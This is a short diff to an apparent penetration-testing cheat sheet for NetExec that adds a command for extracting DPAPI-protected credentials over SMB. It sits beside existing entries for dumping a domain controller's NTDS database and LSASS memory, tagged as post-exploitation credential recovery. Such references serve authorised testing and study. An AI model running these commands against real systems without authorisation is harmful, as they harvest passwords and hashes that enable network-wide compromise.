@@ -182,6 +182,9 @@ Requires Domain Admin or Local Admin Privileges on target Domain Controller
 nxc smb <ip> -u <user> -p <password> -d <domain> --ntds
 ```
 
+## nxc - DPAPI credentials
+nxc smb <ip> -u <user> -p <password> --dpapi
+
 ## nxc - dump lsass
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
